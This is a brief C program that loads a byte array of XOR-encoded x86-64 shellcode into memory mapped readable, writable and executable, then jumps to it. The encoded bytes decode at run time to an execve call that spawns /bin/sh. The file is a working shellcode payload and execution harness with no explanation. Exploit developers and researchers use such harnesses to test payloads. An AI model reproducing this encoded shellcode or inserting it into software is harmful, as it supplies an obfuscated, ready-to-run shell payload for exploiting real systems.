#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

int main() {
	unsigned char code[]={"\xeb\x10\x5f\x48\x31\xc9\xb1\x30\x80\x37\xaa\x48\xff\xc7\xe2\xf8\xeb\x05\xe8\xeb\xff\xff\xff\xe2\x9b\x6a\x1a\x91\xe2\x9b\x63\xfb\xe2\x11\x85\xc8\xc3\xc4\x85\x85\xd9\xc2\xf9\xe2\x23\x4d\xe2\x9b\x5c\xe2\x9b\x78\xa5\xaf"};
    size_t len = sizeof(code);
    
    void *execmem = mmap(NULL, len, PROT_READ | PROT_WRITE | PROT_EXEC,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (execmem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    
    memcpy(execmem, code, len);
    printf("Shellcode length: %zu\n", len);
    
    ((void(*)())execmem)();
    
    return 0;
}
